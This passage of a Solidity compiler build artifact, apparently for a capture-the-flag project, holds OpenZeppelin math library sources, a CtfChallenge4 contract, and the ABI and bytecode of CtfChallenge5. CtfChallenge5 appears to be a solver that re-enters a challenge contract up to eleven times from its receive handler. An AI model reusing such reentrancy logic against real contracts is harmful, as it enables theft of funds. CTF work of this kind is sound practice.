(int104 downcasted) {\\n        downcasted = int104(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(104, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int96 from int256, reverting on\\n     * overflow (when the input is less than smallest int96 or\\n     * greater than largest int96).\\n     *\\n     * Counterpart to Solidity's `int96` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 96 bits\\n     */\\n    function toInt96(int256 value) internal pure returns (int96 downcasted) {\\n        downcasted = int96(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(96, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int88 from int256, reverting on\\n     * overflow (when the input is less than smallest int88 or\\n     * greater than largest int88).\\n     *\\n     * Counterpart to Solidity's `int88` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 88 bits\\n     */\\n    function toInt88(int256 value) internal pure returns (int88 downcasted) {\\n        downcasted = int88(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(88, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int80 from int256, reverting on\\n     * overflow (when the input is less than smallest int80 or\\n     * greater than largest int80).\\n     *\\n     * Counterpart to Solidity's `int80` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 80 bits\\n     */\\n    function toInt80(int256 value) internal pure returns (int80 downcasted) {\\n        downcasted = int80(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(80, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int72 from int256, reverting on\\n     * overflow (when the input is less than smallest int72 or\\n     * greater than largest int72).\\n     *\\n     * Counterpart to Solidity's `int72` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 72 bits\\n     */\\n    function toInt72(int256 value) internal pure returns (int72 downcasted) {\\n        downcasted = int72(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(72, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int64 from int256, reverting on\\n     * overflow (when the input is less than smallest int64 or\\n     * greater than largest int64).\\n     *\\n     * Counterpart to Solidity's `int64` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 64 bits\\n     */\\n    function toInt64(int256 value) internal pure returns (int64 downcasted) {\\n        downcasted = int64(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(64, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int56 from int256, reverting on\\n     * overflow (when the input is less than smallest int56 or\\n     * greater than largest int56).\\n     *\\n     * Counterpart to Solidity's `int56` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 56 bits\\n     */\\n    function toInt56(int256 value) internal pure returns (int56 downcasted) {\\n        downcasted = int56(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(56, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int48 from int256, reverting on\\n     * overflow (when the input is less than smallest int48 or\\n     * greater than largest int48).\\n     *\\n     * Counterpart to Solidity's `int48` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 48 bits\\n     */\\n    function toInt48(int256 value) internal pure returns (int48 downcasted) {\\n        downcasted = int48(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(48, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int40 from int256, reverting on\\n     * overflow (when the input is less than smallest int40 or\\n     * greater than largest int40).\\n     *\\n     * Counterpart to Solidity's `int40` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 40 bits\\n     */\\n    function toInt40(int256 value) internal pure returns (int40 downcasted) {\\n        downcasted = int40(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(40, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int32 from int256, reverting on\\n     * overflow (when the input is less than smallest int32 or\\n     * greater than largest int32).\\n     *\\n     * Counterpart to Solidity's `int32` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 32 bits\\n     */\\n    function toInt32(int256 value) internal pure returns (int32 downcasted) {\\n        downcasted = int32(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(32, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int24 from int256, reverting on\\n     * overflow (when the input is less than smallest int24 or\\n     * greater than largest int24).\\n     *\\n     * Counterpart to Solidity's `int24` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 24 bits\\n     */\\n    function toInt24(int256 value) internal pure returns (int24 downcasted) {\\n        downcasted = int24(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(24, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int16 from int256, reverting on\\n     * overflow (when the input is less than smallest int16 or\\n     * greater than largest int16).\\n     *\\n     * Counterpart to Solidity's `int16` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 16 bits\\n     */\\n    function toInt16(int256 value) internal pure returns (int16 downcasted) {\\n        downcasted = int16(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(16, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted int8 from int256, reverting on\\n     * overflow (when the input is less than smallest int8 or\\n     * greater than largest int8).\\n     *\\n     * Counterpart to Solidity's `int8` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 8 bits\\n     */\\n    function toInt8(int256 value) internal pure returns (int8 downcasted) {\\n        downcasted = int8(value);\\n        if (downcasted != value) {\\n            revert SafeCastOverflowedIntDowncast(8, value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts an unsigned uint256 into a signed int256.\\n     *\\n     * Requirements:\\n     *\\n     * - input must be less than or equal to maxInt256.\\n     */\\n    function toInt256(uint256 value) internal pure returns (int256) {\\n        // Note: Unsafe cast below is okay because `type(int256).max` is guaranteed to be positive\\n        if (value > uint256(type(int256).max)) {\\n            revert SafeCastOverflowedUintToInt(value);\\n        }\\n        return int256(value);\\n    }\\n\\n    /**\\n     * @dev Cast a boolean (false or true) to a uint256 (0 or 1) with no jump.\\n     */\\n    function toUint(bool b) internal pure returns (uint256 u) {\\n        assembly (\\\"memory-safe\\\") {\\n            u := iszero(iszero(b))\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0x195533c86d0ef72bcc06456a4f66a9b941f38eb403739b00f21fd7c1abd1ae54\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/SignedMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SignedMath.sol)\\n\\npragma solidity ^0.8.20;\\n\\nimport {SafeCast} from \\\"./SafeCast.sol\\\";\\n\\n/**\\n * @dev Standard signed math utilities missing in the Solidity language.\\n */\\nlibrary SignedMath {\\n    /**\\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\\n     *\\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\\n     * one branch when needed, making this function more expensive.\\n     */\\n    function ternary(bool condition, int256 a, int256 b) internal pure returns (int256) {\\n        unchecked {\\n            // branchless ternary works because:\\n            // b ^ (a ^ b) == a\\n            // b ^ 0 == b\\n            return b ^ ((a ^ b) * int256(SafeCast.toUint(condition)));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two signed numbers.\\n     */\\n    function max(int256 a, int256 b) internal pure returns (int256) {\\n        return ternary(a > b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two signed numbers.\\n     */\\n    function min(int256 a, int256 b) internal pure returns (int256) {\\n        return ternary(a < b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the average of two signed numbers without overflow.\\n     * The result is rounded towards zero.\\n     */\\n    function average(int256 a, int256 b) internal pure returns (int256) {\\n        // Formula from the book \\\"Hacker's Delight\\\"\\n        int256 x = (a & b) + ((a ^ b) >> 1);\\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\\n    }\\n\\n    /**\\n     * @dev Returns the absolute unsigned value of a signed value.\\n     */\\n    function abs(int256 n) internal pure returns (uint256) {\\n        unchecked {\\n            // Formula from the \\\"Bit Twiddling Hacks\\\" by Sean Eron Anderson.\\n            // Since `n` is a signed integer, the generated bytecode will use the SAR opcode to perform the right shift,\\n            // taking advantage of the most significant (or \\\"sign\\\" bit) in two's complement representation.\\n            // This opcode adds new most significant bits set to the value of the previous most significant bit. As a result,\\n            // the mask will either be `bytes32(0)` (if n is positive) or `~bytes32(0)` (if n is negative).\\n            int256 mask = n >> 255;\\n\\n            // A `bytes32(0)` mask leaves the input unchanged, while a `~bytes32(0)` mask complements it.\\n            return uint256((n + mask) ^ mask);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xb1970fac7b64e6c09611e6691791e848d5e3fe410fa5899e7df2e0afd77a99e3\",\"license\":\"MIT\"},\"contracts/CtfChallenge4.sol\":{\"content\":\"// SPDX-License-Identifier: UNLICENSED\\npragma solidity ^0.8.28;\\n\\nimport \\\"@openzeppelin/contracts/access/Ownable.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol\\\";\\nimport \\\"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\\\";\\n\\ncontract CtfChallenge4 {\\n    using ECDSA for bytes32;\\n    using MessageHashUtils for bytes32;\\n\\n    event HashCalculated(bytes32 theHash);\\n\\n    function mintFlag() public returns (bytes32) {\\n\\n        bytes32 message = keccak256(abi.encode(\\\"BG CTF Challenge 4\\\", msg.sender));\\n        bytes32 hash = message.toEthSignedMessageHash();\\n\\n        emit HashCalculated(hash);\\n\\n        return hash;\\n\\n    }\\n}\\n\",\"keccak256\":\"0x747da3a022a1ffc1b568a1848ee88254f38d820af4e4a17c46656cd3af7c458a\",\"license\":\"UNLICENSED\"}},\"version\":1}","storageLayout":{"storage":[],"types":null},"userdoc":{"kind":"user","methods":{},"version":1}}},"contracts/CtfChallenge5.sol":{"CtfChallenge5":{"abi":[{"inputs":[{"internalType":"address","name":"_challengeAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[],"name":"fallbackCalled","type":"event"},{"anonymous":false,"inputs":[],"name":"recieveCalled","type":"event"},{"stateMutability":"nonpayable","type":"fallback"},{"inputs":[],"name":"TARGET","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"callCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"challenge","outputs":[{"internalType":"contract IChallenge5","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"startClaim","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"evm":{"bytecode":{"functionDebugData":{"@_5726":{"entryPoint":null,"id":5726,"parameterSlots":1,"returnSlots":0},"abi_decode_t_address_fromMemory":{"entryPoint":198,"id":null,"parameterSlots":2,"returnSlots":1},"abi_decode_tuple_t_address_fromMemory":{"entryPoint":219,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"cleanup_t_address":{"entryPoint":157,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":125,"id":null,"parameterSlots":1,"returnSlots":1},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":120,"id":null,"parameterSlots":0,"returnSlots":0},"validator_revert_t_address":{"entryPoint":175,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nativeSrc":"0:1199:14","nodeType":"YulBlock","src":"0:1199:14","statements":[{"body":{"nativeSrc":"47:35:14","nodeType":"YulBlock","src":"47:35:14","statements":[{"nativeSrc":"57:19:14","nodeType":"YulAssignment","src":"57:19:14","value":{"arguments":[{"kind":"number","nativeSrc":"73:2:14","nodeType":"YulLiteral","src":"73:2:14","type":"","value":"64"}],"functionName":{"name":"mload","nativeSrc":"67:5:14","nodeType":"YulIdentifier","src":"67:5:14"},"nativeSrc":"67:9:14","nodeType":"YulFunctionCall","src":"67:9:14"},"variableNames":[{"name":"memPtr","nativeSrc":"57:6:14","nodeType":"YulIdentifier","src":"57:6:14"}]}]},"name":"allocate_unbounded","nativeSrc":"7:75:14","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nativeSrc":"40:6:14","nodeType":"YulTypedName","src":"40:6:14","type":""}],"src":"7:75:14"},{"body":{"nativeSrc":"177:28:14","nodeType":"YulBlock","src":"177:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"194:1:14","nodeType":"YulLiteral","src":"194:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"197:1:14","nodeType":"YulLiteral","src":"197:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"187:6:14","nodeType":"YulIdentifier","src":"187:6:14"},"nativeSrc":"187:12:14","nodeType":"YulFunctionCall","src":"187:12:14"},"nativeSrc":"187:12:14","nodeType":"YulExpressionStatement","src":"187:12:14"}]},"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"88:117:14","nodeType":"YulFunctionDefinition","src":"88:117:14"},{"body":{"nativeSrc":"300:28:14","nodeType":"YulBlock","src":"300:28:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"317:1:14","nodeType":"YulLiteral","src":"317:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"320:1:14","nodeType":"YulLiteral","src":"320:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"310:6:14","nodeType":"YulIdentifier","src":"310:6:14"},"nativeSrc":"310:12:14","nodeType":"YulFunctionCall","src":"310:12:14"},"nativeSrc":"310:12:14","nodeType":"YulExpressionStatement","src":"310:12:14"}]},"name":"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db","nativeSrc":"211:117:14","nodeType":"YulFunctionDefinition","src":"211:117:14"},{"body":{"nativeSrc":"379:81:14","nodeType":"YulBlock","src":"379:81:14","statements":[{"nativeSrc":"389:65:14","nodeType":"YulAssignment","src":"389:65:14","value":{"arguments":[{"name":"value","nativeSrc":"404:5:14","nodeType":"YulIdentifier","src":"404:5:14"},{"kind":"number","nativeSrc":"411:42:14","nodeType":"YulLiteral","src":"411:42:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"and","nativeSrc":"400:3:14","nodeType":"YulIdentifier","src":"400:3:14"},"nativeSrc":"400:54:14","nodeType":"YulFunctionCall","src":"400:54:14"},"variableNames":[{"name":"cleaned","nativeSrc":"389:7:14","nodeType":"YulIdentifier","src":"389:7:14"}]}]},"name":"cleanup_t_uint160","nativeSrc":"334:126:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"361:5:14","nodeType":"YulTypedName","src":"361:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"371:7:14","nodeType":"YulTypedName","src":"371:7:14","type":""}],"src":"334:126:14"},{"body":{"nativeSrc":"511:51:14","nodeType":"YulBlock","src":"511:51:14","statements":[{"nativeSrc":"521:35:14","nodeType":"YulAssignment","src":"521:35:14","value":{"arguments":[{"name":"value","nativeSrc":"550:5:14","nodeType":"YulIdentifier","src":"550:5:14"}],"functionName":{"name":"cleanup_t_uint160","nativeSrc":"532:17:14","nodeType":"YulIdentifier","src":"532:17:14"},"nativeSrc":"532:24:14","nodeType":"YulFunctionCall","src":"532:24:14"},"variableNames":[{"name":"cleaned","nativeSrc":"521:7:14","nodeType":"YulIdentifier","src":"521:7:14"}]}]},"name":"cleanup_t_address","nativeSrc":"466:96:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"493:5:14","nodeType":"YulTypedName","src":"493:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"503:7:14","nodeType":"YulTypedName","src":"503:7:14","type":""}],"src":"466:96:14"},{"body":{"nativeSrc":"611:79:14","nodeType":"YulBlock","src":"611:79:14","statements":[{"body":{"nativeSrc":"668:16:14","nodeType":"YulBlock","src":"668:16:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"677:1:14","nodeType":"YulLiteral","src":"677:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"680:1:14","nodeType":"YulLiteral","src":"680:1:14","type":"","value":"0"}],"functionName":{"name":"revert","nativeSrc":"670:6:14","nodeType":"YulIdentifier","src":"670:6:14"},"nativeSrc":"670:12:14","nodeType":"YulFunctionCall","src":"670:12:14"},"nativeSrc":"670:12:14","nodeType":"YulExpressionStatement","src":"670:12:14"}]},"condition":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"634:5:14","nodeType":"YulIdentifier","src":"634:5:14"},{"arguments":[{"name":"value","nativeSrc":"659:5:14","nodeType":"YulIdentifier","src":"659:5:14"}],"functionName":{"name":"cleanup_t_address","nativeSrc":"641:17:14","nodeType":"YulIdentifier","src":"641:17:14"},"nativeSrc":"641:24:14","nodeType":"YulFunctionCall","src":"641:24:14"}],"functionName":{"name":"eq","nativeSrc":"631:2:14","nodeType":"YulIdentifier","src":"631:2:14"},"nativeSrc":"631:35:14","nodeType":"YulFunctionCall","src":"631:35:14"}],"functionName":{"name":"iszero","nativeSrc":"624:6:14","nodeType":"YulIdentifier","src":"624:6:14"},"nativeSrc":"624:43:14","nodeType":"YulFunctionCall","src":"624:43:14"},"nativeSrc":"621:63:14","nodeType":"YulIf","src":"621:63:14"}]},"name":"validator_revert_t_address","nativeSrc":"568:122:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"604:5:14","nodeType":"YulTypedName","src":"604:5:14","type":""}],"src":"568:122:14"},{"body":{"nativeSrc":"759:80:14","nodeType":"YulBlock","src":"759:80:14","statements":[{"nativeSrc":"769:22:14","nodeType":"YulAssignment","src":"769:22:14","value":{"arguments":[{"name":"offset","nativeSrc":"784:6:14","nodeType":"YulIdentifier","src":"784:6:14"}],"functionName":{"name":"mload","nativeSrc":"778:5:14","nodeType":"YulIdentifier","src":"778:5:14"},"nativeSrc":"778:13:14","nodeType":"YulFunctionCall","src":"778:13:14"},"variableNames":[{"name":"value","nativeSrc":"769:5:14","nodeType":"YulIdentifier","src":"769:5:14"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"827:5:14","nodeType":"YulIdentifier","src":"827:5:14"}],"functionName":{"name":"validator_revert_t_address","nativeSrc":"800:26:14","nodeType":"YulIdentifier","src":"800:26:14"},"nativeSrc":"800:33:14","nodeType":"YulFunctionCall","src":"800:33:14"},"nativeSrc":"800:33:14","nodeType":"YulExpressionStatement","src":"800:33:14"}]},"name":"abi_decode_t_address_fromMemory","nativeSrc":"696:143:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"737:6:14","nodeType":"YulTypedName","src":"737:6:14","type":""},{"name":"end","nativeSrc":"745:3:14","nodeType":"YulTypedName","src":"745:3:14","type":""}],"returnVariables":[{"name":"value","nativeSrc":"753:5:14","nodeType":"YulTypedName","src":"753:5:14","type":""}],"src":"696:143:14"},{"body":{"nativeSrc":"922:274:14","nodeType":"YulBlock","src":"922:274:14","statements":[{"body":{"nativeSrc":"968:83:14","nodeType":"YulBlock","src":"968:83:14","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"970:77:14","nodeType":"YulIdentifier","src":"970:77:14"},"nativeSrc":"970:79:14","nodeType":"YulFunctionCall","src":"970:79:14"},"nativeSrc":"970:79:14","nodeType":"YulExpressionStatement","src":"970:79:14"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"943:7:14","nodeType":"YulIdentifier","src":"943:7:14"},{"name":"headStart","nativeSrc":"952:9:14","nodeType":"YulIdentifier","src":"952:9:14"}],"functionName":{"name":"sub","nativeSrc":"939:3:14","nodeType":"YulIdentifier","src":"939:3:14"},"nativeSrc":"939:23:14","nodeType":"YulFunctionCall","src":"939:23:14"},{"kind":"number","nativeSrc":"964:2:14","nodeType":"YulLiteral","src":"964:2:14","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"935:3:14","nodeType":"YulIdentifier","src":"935:3:14"},"nativeSrc":"935:32:14","nodeType":"YulFunctionCall","src":"935:32:14"},"nativeSrc":"932:119:14","nodeType":"YulIf","src":"932:119:14"},{"nativeSrc":"1061:128:14","nodeType":"YulBlock","src":"1061:128:14","statements":[{"nativeSrc":"1076:15:14","nodeType":"YulVariableDeclaration","src":"1076:15:14","value":{"kind":"number","nativeSrc":"1090:1:14","nodeType":"YulLiteral","src":"1090:1:14","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"1080:6:14","nodeType":"YulTypedName","src":"1080:6:14","type":""}]},{"nativeSrc":"1105:74:14","nodeType":"YulAssignment","src":"1105:74:14","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"1151:9:14","nodeType":"YulIdentifier","src":"1151:9:14"},{"name":"offset","nativeSrc":"1162:6:14","nodeType":"YulIdentifier","src":"1162:6:14"}],"functionName":{"name":"add","nativeSrc":"1147:3:14","nodeType":"YulIdentifier","src":"1147:3:14"},"nativeSrc":"1147:22:14","nodeType":"YulFunctionCall","src":"1147:22:14"},{"name":"dataEnd","nativeSrc":"1171:7:14","nodeType":"YulIdentifier","src":"1171:7:14"}],"functionName":{"name":"abi_decode_t_address_fromMemory","nativeSrc":"1115:31:14","nodeType":"YulIdentifier","src":"1115:31:14"},"nativeSrc":"1115:64:14","nodeType":"YulFunctionCall","src":"1115:64:14"},"variableNames":[{"name":"value0","nativeSrc":"1105:6:14","nodeType":"YulIdentifier","src":"1105:6:14"}]}]}]},"name":"abi_decode_tuple_t_address_fromMemory","nativeSrc":"845:351:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"892:9:14","nodeType":"YulTypedName","src":"892:9:14","type":""},{"name":"dataEnd","nativeSrc":"903:7:14","nodeType":"YulTypedName","src":"903:7:14","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"915:6:14","nodeType":"YulTypedName","src":"915:6:14","type":""}],"src":"845:351:14"}]},"contents":"{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n","id":14,"language":"Yul","name":"#utility.yul"}],"linkReferences":{},"object":"608060405234801561001057600080fd5b506040516104df3803806104df833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6103c8806101176000396000f3fe6080604052600436106100435760003560e01c80634b28f9a2146100fc578063cc1f2afa14610127578063d2ef739814610152578063ecbfc0771461017d576100ee565b366100ee57600b60015410156100ec576001600081548092919061006690610286565b919050555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166304d092c76040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100d357600080fd5b505af11580156100e7573d6000803e3d6000fd5b505050505b005b3480156100fa57600080fd5b005b34801561010857600080fd5b50610111610194565b60405161011e91906102dd565b60405180910390f35b34801561013357600080fd5b5061013c61019a565b60405161014991906102dd565b60405180910390f35b34801561015e57600080fd5b5061016761019f565b6040516101749190610377565b60405180910390f35b34801561018957600080fd5b506101926101c3565b005b60015481565b600b81565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060018190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166304d092c76040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561023357600080fd5b505af1158015610247573d6000803e3d6000fd5b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b60006102918261027c565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036102c3576102c261024d565b5b600182019050919050565b6102d78161027c565b82525050565b60006020820190506102f260008301846102ce565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061033d610338610333846102f8565b610318565b6102f8565b9050919050565b600061034f82610322565b9050919050565b600061036182610344565b9050919050565b61037181610356565b82525050565b600060208201905061038c6000830184610368565b9291505056fea264697066735822122076dc1d39e6fc4c5430e3265f240c0deb629dd90162a79f696cd9fa85f5c72d0564736f6c634300081c0033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x4DF CODESIZE SUB DUP1 PUSH2 0x4DF DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xDB JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x108 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA8 DUP3 PUSH2 0x7D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB8 DUP2 PUSH2 0x9D JUMP JUMPDEST DUP2 EQ PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xD5 DUP2 PUSH2 0xAF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xF1 JUMPI PUSH2 0xF0 PUSH2 0x78 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xFF DUP5 DUP3 DUP6 ADD PUSH2 0xC6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3C8 DUP1 PUSH2 0x117 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4B28F9A2 EQ PUSH2 0xFC JUMPI DUP1 PUSH4 0xCC1F2AFA EQ PUSH2 0x127 JUMPI DUP1 PUSH4 0xD2EF7398 EQ PUSH2 0x152 JUMPI DUP1 PUSH4 0xECBFC077 EQ PUSH2 0x17D JUMPI PUSH2 0xEE JUMP JUMPDEST CALLDATASIZE PUSH2 0xEE JUMPI PUSH1 0xB PUSH1 0x1 SLOAD LT ISZERO PUSH2 0xEC JUMPI PUSH1 0x1 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x66 SWAP1 PUSH2 0x286 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF 